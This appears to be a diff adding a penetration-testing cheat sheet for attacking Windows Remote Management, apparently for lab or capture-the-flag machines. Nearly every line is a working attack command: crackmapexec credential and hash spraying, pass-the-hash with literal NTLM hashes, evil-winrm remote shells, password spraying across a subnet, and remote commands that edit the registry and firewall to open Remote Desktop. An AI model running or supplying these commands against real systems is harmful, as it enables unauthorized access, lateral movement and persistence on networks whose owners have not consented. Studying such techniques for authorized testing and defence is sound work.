@@ -1,1 +1,42 @@
+crackmapexec winrm 192.168.104.175 -u users.txt -H clean-hashes.txt
 
+Don’t Sleep on WinRM
+Once you’ve found valid credentials, CrackMapExec’s SMB function will only display “Pwn3d” if the user is a local administrator.
+crackmapexec winrm <target> -u <user> -p <password>
+
+If this returns Pwn3d, then you can leverage EvilWinRM to get the shell.
+evil-winrm -i <target> -u <username> -p <password>
+
+Pass a Hash
+root@kali# crackmapexec winrm 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+
+Pass-the-Hash Attacks Over WinRM (5985)
+crackmapexec
+Exactly the same way we used crackmap to pass-the-hash over SMB, we can also use it to pass-the-hash over WinRM.
+    crackmapexec can execute commands over SMB, WinRM, LDAP, MSSQL, or SSH.
+
+Reusing our last commands, we can just replace ‘smb’ with ‘winrm’ and execute commands the same way as before with the -x and -X switches.
+
+crackmapexec winrm 172.16.1.x -d site.local -u administrator -H 5b38382017f8c0ac215895d5f9aacac4 -x dir
+crackmapexec winrm 172.16.1.x -d site.local -u administrator -H 5b38382017f8c0ac215895d5f9aacac4 -X Get-ChildItem <-- Powershell is cap X
+
+
+Here is the syntax for a pass-the-hash attack using evil-winrm:
+evil-winrm -u administrator -H 5b38382017f8c0ac215895d5f9aacac4 -i 172.16.1.x
+
+Password spraying
+Password spraying (without bruteforce)
+#~ cme winrm 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
+
+Authentication
+WinRM Authentication
+Testing credentials
+#~ cme winrm 192.168.1.0/24 -u user -p password
+
+
+crackmapexec winrm ip -d local -u administrator -p top100.txt
+crackmapexec winrm -d . -u Administrator -p 'badminton' -x "whoami" 10.129.245.x
+crackmapexec winrm -d . -u Administrator -p 'badminton' -x 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f' 10.129.81.x
+crackmapexec winrm -d . -u Administrator -p 'badminton' -x 'netsh advfirewall firewall set rule group="remote desktop" new enable=yes' 10.129.81.x
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh advfirewall firewall set rule group="remote desktop" new enable=yes
